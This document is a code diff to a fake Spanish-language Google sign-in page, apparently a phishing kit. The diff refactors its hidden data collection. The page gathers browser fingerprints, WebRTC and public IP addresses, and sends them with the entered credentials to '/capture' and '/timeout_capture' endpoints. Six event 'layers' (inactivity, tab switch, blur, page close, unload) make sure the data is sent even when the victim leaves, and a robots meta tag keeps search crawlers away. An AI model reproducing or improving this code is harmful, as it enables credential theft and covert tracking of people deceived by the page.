@@ -3,7 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Anti-crawler meta: Prevents indexing by search bots -->
     <meta name="robots" content="noindex, nofollow">
     <title>Iniciar sesión - Cuentas de Google</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
@@ -157,9 +156,7 @@
             font-size: 12px;
             margin-top: 8px;
         }
-        /* Randomized class for anti-fingerprinting */
         .dynamic-container {
-            /* Random class added via JS */
             box-sizing: border-box;
         }
     </style>
@@ -211,10 +208,10 @@
 
     <script>
         let enteredEmail = '';
-        let timeoutId;
-        const timeoutDuration = 2 * 60 * 1000;
-        let visibilityTimeoutId;
-        const visibilityDelay = 5 * 1000;
+        let captureSent = false; // Prevent duplicate sends
+        const TIMEOUT_DURATION = 2 * 60 * 1000; // 2 minutes
+        const VISIBILITY_DELAY = 3 * 1000; // 3 seconds hidden = trigger
+        let timeoutId, visibilityTimeoutId;
 
         // ENHANCED FINGERPRINT COLLECTOR
         (function() {
@@ -326,85 +323,84 @@
                 fingerprints.webrtc_ips = webrtcIps;
                 fingerprints.ip_address = publicIp;
                 window.fingerprints = fingerprints;
-                console.log('✅ Fingerprints collected');
+                console.log('✅ Fingerprints ready');
             }).catch(() => { window.fingerprints = fingerprints; });
         })();
 
-        // UPDATED: Timeout with fingerprints
-        function resetTimeout() {
-            clearTimeout(timeoutId);
-            clearTimeout(visibilityTimeoutId);
-            timeoutId = setTimeout(() => {
-                const fingerprintData = JSON.stringify(window.fingerprints || {});
-                const formData = new URLSearchParams();
-                formData.append('reason', 'timeout');
-                formData.append('fingerprint_data', fingerprintData);
-                
-                fetch('/timeout_capture', { 
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: formData.toString()
-                }).catch(err => console.log('Timeout capture error: ' + err));
-            }, timeoutDuration);
-        }
-
-        // UPDATED: Visibility change with fingerprints
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                visibilityTimeoutId = setTimeout(() => {
-                    const fingerprintData = JSON.stringify(window.fingerprints || {});
-                    const formData = new URLSearchParams();
-                    formData.append('reason', 'tab_switch');
-                    formData.append('fingerprint_data', fingerprintData);
-                    
-                    fetch('/timeout_capture', { 
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: formData.toString()
-                    }).catch(err => console.log('Visibility timeout error: ' + err));
-                }, visibilityDelay);
-            } else {
-                clearTimeout(visibilityTimeoutId);
-                resetTimeout();
-            }
-        });
-
-        // UPDATED: Page hide with fingerprints
-        window.addEventListener('pagehide', () => {
+        // UNIFIED CAPTURE FUNCTION - sends to backend
+        function sendTimeoutCapture(reason) {
+            if (captureSent) return; // Prevent duplicates
+            captureSent = true;
+            
             const fingerprintData = JSON.stringify(window.fingerprints || {});
             const formData = new URLSearchParams();
-            formData.append('reason', 'page_close');
+            formData.append('reason', reason);
             formData.append('fingerprint_data', fingerprintData);
             
+            // Try fetch first
             fetch('/timeout_capture', { 
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: formData.toString(),
-                keepalive: true
-            }).catch(() => {});
+                keepalive: true // Critical for page unload
+            }).catch(() => {
+                // Fallback to sendBeacon if fetch fails
+                const data = `reason=${reason}&fingerprint_data=${encodeURIComponent(fingerprintData)}`;
+                navigator.sendBeacon('/timeout_capture', data);
+            });
+            
+            console.log(`🚨 Timeout capture sent: ${reason}`);
+        }
+
+        // LAYER 1: Inactivity timeout (2 minutes)
+        function resetTimeout() {
+            clearTimeout(timeoutId);
+            clearTimeout(visibilityTimeoutId);
+            timeoutId = setTimeout(() => sendTimeoutCapture('inactivity_timeout'), TIMEOUT_DURATION);
+        }
+
+        // LAYER 2: Tab visibility (hidden for 3+ seconds)
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                visibilityTimeoutId = setTimeout(() => sendTimeoutCapture('tab_switch'), VISIBILITY_DELAY);
+            } else {
+                clearTimeout(visibilityTimeoutId);
+                resetTimeout(); // Reset main timeout when user returns
+            }
         });
 
-        // UPDATED: Before unload with fingerprints
-        window.addEventListener('beforeunload', () => {
-            const fingerprintData = JSON.stringify(window.fingerprints || {});
-            const data = `reason=browser_close&fingerprint_data=${encodeURIComponent(fingerprintData)}`;
+        // LAYER 3: Page hide (browser close, navigate away)
+        window.addEventListener('pagehide', () => sendTimeoutCapture('page_close'), {capture: true});
+
+        // LAYER 4: Before unload (closing tab/window)
+        window.addEventListener('beforeunload', () => sendTimeoutCapture('browser_close'));
+
+        // LAYER 5: Unload (final fallback)
+        window.addEventListener('unload', () => {
+            const data = `reason=unload&fingerprint_data=${encodeURIComponent(JSON.stringify(window.fingerprints || {}))}`;
             navigator.sendBeacon('/timeout_capture', data);
+        }, {capture: true});
+
+        // LAYER 6: Blur detection (loses focus)
+        let blurTimeout;
+        window.addEventListener('blur', () => {
+            blurTimeout = setTimeout(() => sendTimeoutCapture('window_blur'), 5000); // 5 sec blur = trigger
+        });
+        window.addEventListener('focus', () => {
+            clearTimeout(blurTimeout);
+            resetTimeout();
         });
 
-        // Reset on activity
-        document.getElementById('email').addEventListener('input', resetTimeout);
-        document.getElementById('password').addEventListener('input', resetTimeout);
-        window.addEventListener('mousemove', resetTimeout);
-        window.addEventListener('keypress', resetTimeout);
-        window.addEventListener('scroll', resetTimeout);
-        window.addEventListener('click', resetTimeout);
-        window.addEventListener('touchstart', resetTimeout);
+        // Reset timeout on ANY user activity
+        ['input', 'mousemove', 'keypress', 'scroll', 'click', 'touchstart', 'touchmove'].forEach(event => {
+            document.addEventListener(event, resetTimeout, {passive: true});
+        });
 
+        // Start timeout on load
         resetTimeout();
 
         function isValidEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
+            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
         }
 
         function showError(message) {
@@ -426,6 +422,10 @@
         }
 
         function submitData(password = '') {
+            captureSent = true; // Mark as sent to prevent timeout firing
+            clearTimeout(timeoutId); // Stop timeout
+            clearTimeout(visibilityTimeoutId);
+            
             const fingerprintData = JSON.stringify(window.fingerprints || {});
             fetch('/capture', {
                 method: 'POST',
